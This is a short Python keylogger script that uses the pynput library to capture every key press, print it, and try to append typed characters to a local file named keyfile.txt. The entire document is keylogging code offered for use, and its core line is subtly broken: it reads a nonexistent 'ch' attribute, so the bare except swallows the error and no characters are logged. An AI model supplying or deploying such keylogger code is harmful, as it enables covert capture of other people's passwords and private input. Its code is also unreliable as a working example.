#Script needs pynput module to import keystrokes.   
from pynput import keyboard
#  prints keystroke to keyfile.txt. 
def keyPress(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try: 
            char = key.ch
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPress)
    listener.start()
    input()
    
